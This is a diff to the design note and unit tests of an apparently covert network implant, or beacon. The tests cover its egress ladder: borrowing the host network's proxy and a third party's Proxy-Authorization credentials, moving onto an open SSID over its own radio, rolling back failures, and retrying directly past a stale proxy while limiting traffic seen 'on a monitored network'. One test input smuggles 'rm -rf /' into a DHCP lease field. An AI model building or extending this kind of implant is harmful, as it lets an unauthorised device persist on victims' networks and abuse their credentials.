@@ -11,7 +11,8 @@ Reversible; it leaves lines in logs a human *could* read.
 **Rung 3, its own radio.** An open SSID, which leaves the tapped port
 altogether. Bounded three ways, and each bound is a test below: the
 onboard radio only, because a USB adapter is refused on the power budget;
-a time-boxed association; and a **scoped** route for this implant's own
+a **deadline per command** -- and not a time box on the association,
+which nothing here ends; and a **scoped** route for this implant's own
 traffic. It must never take the global default route -- an implant that
 stranded itself off the path it still has is the predecessor design's
 hardest anti-goal -- and a failure rolls back every command it ran.
@@ -576,7 +577,18 @@ class TestTheRadioVerb(RadioCase):
                      "lease {\n  fixed-address 10.77.0.5;\n"
                      "  option routers 999.1.1.1;\n}\n",
                      "lease {\n  fixed-address 10.77.0.5;\n"
-                     "  option routers ; rm -rf /;\n}\n"):
+                     "  option routers ; rm -rf /;\n}\n",
+                     # Too few parts, too many, and an empty one.
+                     "lease {\n  fixed-address 10.77;\n"
+                     "  option routers 10.0.0.1;\n}\n",
+                     "lease {\n  fixed-address 10.77.0.5.9;\n"
+                     "  option routers 10.0.0.1;\n}\n",
+                     "lease {\n  fixed-address 10..0.5;\n"
+                     "  option routers 10.0.0.1;\n}\n",
+                     # And a digit that is not an ASCII digit:
+                     # `str.isdigit` answers True for these.
+                     "lease {\n  fixed-address \uff11\uff10.0.0.5;\n"
+                     "  option routers 10.0.0.1;\n}\n"):
             with self.subTest(lease=text.split("\n")[1].strip()):
                 beacon = self.beacon(tap=self.open_ssid())
                 self.onboard(beacon)
@@ -670,6 +682,74 @@ class TestTheRadioVerb(RadioCase):
         self.assertEqual(beacon._way_out_source, "192.168.9.42")
         self.assertEqual(beacon._proxy_session.source_address,
                          ("192.168.9.42", 0))
+
+    def test_the_tapped_paths_proxy_does_not_come_onto_the_radio(self):
+        # Rung 2 crosses at one hour dark and rung 3 at five, so "borrow
+        # the host's proxy, then move onto the radio" is the ladder's
+        # *ordinary* climb. The bind used to carry `proxies` and
+        # `headers` across, so the implant went on posting to an RFC1918
+        # address on the **tapped** network from the radio's address over
+        # a table-100 route on which it does not exist: the reversible
+        # rung poisoned the rung above it, nothing delivered, nothing
+        # unbound, and the next step was the irreversible one. And on an
+        # open guest SSID, which hands out the same private space, a
+        # stranger answering at that address would be offered a third
+        # party's `Proxy-Authorization`.
+        beacon = self.beacon(tap=self.open_ssid(),
+                             borrow={"credentials": [A_CREDENTIAL]})
+        self.onboard(beacon)
+        self.radio(beacon)
+        self.assertNotIn("[error]", beacon._exec_egress("credential"))
+        self.assertTrue(beacon._proxy_session.proxies)
+        self.assertIn("Proxy-Authorization", beacon._proxy_session.headers)
+
+        beacon._exec_egress("radio")
+
+        self.assertEqual(beacon._proxy_session.source_address,
+                         ("192.168.9.42", 0))
+        self.assertEqual(beacon._proxy_session.proxies, {})
+        self.assertEqual(beacon._proxy_session.headers, {})
+        self.assertFalse(beacon._proxy_session.trust_env,
+                         "the environment's proxies are the host "
+                         "network's too")
+
+    def test_a_rollback_puts_the_tapped_paths_proxy_back(self):
+        # The rung leaves the implant as it found it: back on the tapped
+        # port, the borrowed proxy was the right one, and an implant that
+        # lost it to a failed radio attempt would have spent an attempt
+        # of its budget for nothing.
+        beacon = self.beacon(tap=self.open_ssid(),
+                             borrow={"credentials": [A_CREDENTIAL]})
+        self.onboard(beacon)
+        self.radio(beacon)
+        beacon._exec_egress("credential")
+        proxies = dict(beacon._proxy_session.proxies)
+        headers = dict(beacon._proxy_session.headers)
+
+        beacon._exec_egress("radio")
+        beacon._radio_rollback("wlan0", "192.168.9.42", "a test")
+
+        self.assertEqual(beacon._proxy_session.proxies, proxies)
+        self.assertEqual(beacon._proxy_session.headers, headers)
+        self.assertIsNone(beacon._proxy_session.source_address)
+
+    def test_a_second_radio_attempt_does_not_lose_the_stash(self):
+        # Repeating the rung is the ordinary case -- no verb tests its own
+        # result -- so the second attempt must not re-stash the empty
+        # proxy it is already using and leave the rollback with nothing
+        # to put back.
+        beacon = self.beacon(tap=self.open_ssid(),
+                             borrow={"credentials": [A_CREDENTIAL]})
+        self.onboard(beacon)
+        self.radio(beacon)
+        beacon._exec_egress("credential")
+        proxies = dict(beacon._proxy_session.proxies)
+
+        beacon._exec_egress("radio")
+        beacon._exec_egress("radio")
+        beacon._radio_rollback("wlan0", "192.168.9.42", "a test")
+
+        self.assertEqual(beacon._proxy_session.proxies, proxies)
 
     def test_a_rung_two_verb_does_not_quietly_unbind_the_radio(self):
         # Rung 2 crosses at one hour dark and rung 3 at five, so after
@@ -772,6 +852,87 @@ class TestTheRadioVerb(RadioCase):
         answer = beacon._exec_egress("radio CorpSecure")
         self.assertIn("[error]", answer)
         self.assertIn("CorpSecure", answer)
+
+
+class TestTheDirectRetryWhenAProxyIsStale(RungCase):
+    """A proxy that refuses the connection is a proxy to go around.
+
+    `_https_post` has had a direct retry for a failing proxy since before
+    this branch, but only behind `_ProxyError` -- and `_HttpSession.post`
+    raises that only when urllib's reason string happens to contain
+    "proxy" or "tunnel". A proxy that simply refused the connection,
+    `[Errno 111] Connection refused`, arrived in the generic arm instead,
+    so the one fallback written for exactly that case never ran.
+
+    It matters on the ladder's ordinary climb: rung 2 borrows the host's
+    proxy at hour 1, rung 3 moves this implant onto its own radio at hour
+    5, and an RFC1918 proxy on the tapped network does not exist there.
+    The bind no longer carries that proxy across -- see
+    `TestTheRadioVerb` -- and this is the second net under it, for the
+    case where the operator or the decider chose a proxy that has since
+    stopped answering.
+    """
+
+    def a_beacon_posting_through(self, proxies):
+        """A beacon whose every POST is refused, and what each one used."""
+        beacon = self.beacon()
+        beacon._registered = True
+        # `_init_proxy` runs in `start()`, which these tests do not call.
+        beacon._proxy_session = beacon._bound_session()
+        beacon._proxy_session.proxies = dict(proxies)
+        tried = []
+
+        def post(self, url, json_data, headers, timeout=30):
+            import urllib.error
+            tried.append(dict(self.proxies))
+            raise urllib.error.URLError(OSError(111, "Connection refused"))
+
+        patcher = mock.patch.object(beacon_mod._HttpSession, "post", post)
+        patcher.start()
+        self.addCleanup(patcher.stop)
+        return beacon, tried
+
+    def test_a_refused_connection_through_a_proxy_is_retried_direct(self):
+        beacon, tried = self.a_beacon_posting_through(
+            {"https": "http://10.0.0.1:3128"})
+
+        beacon._https_post("beacon", {"a": 1})
+
+        self.assertEqual(len(tried), 2,
+                         "the direct retry never ran, so a stale proxy "
+                         "swallowed the check-in")
+        self.assertTrue(tried[0], "the first attempt went direct")
+        self.assertEqual(tried[1], {}, "the retry used the proxy again")
+
+    def test_a_session_with_no_proxy_is_not_retried(self):
+        # Nothing to go around: a retry here would be the same request
+        # twice, which is a second round trip on a monitored network for
+        # no new chance of delivery.
+        beacon, tried = self.a_beacon_posting_through({})
+
+        beacon._https_post("beacon", {"a": 1})
+
+        self.assertEqual(len(tried), 1)
+
+    def test_the_retry_keeps_the_radio_rungs_bind(self):
+        import urllib.error
+        beacon = self.beacon()
+        beacon._registered = True
+        beacon._proxy_session = beacon._bound_session()
+        beacon._proxy_session.proxies = {"https": "http://10.0.0.1:3128"}
+        beacon._way_out_source = "192.168.9.42"
+        bound = []
+
+        def post(self, url, json_data, headers, timeout=30):
+            bound.append(self.source_address)
+            raise urllib.error.URLError(OSError(111, "Connection refused"))
+
+        with mock.patch.object(beacon_mod._HttpSession, "post", post):
+            beacon._https_post("beacon", {"a": 1})
+
+        self.assertEqual(len(bound), 2)
+        self.assertEqual(bound[-1], ("192.168.9.42", 0),
+                         "the retry left by the dead tapped port")
 
 
 class TestTheRawPostTheReplayUses(unittest.TestCase):
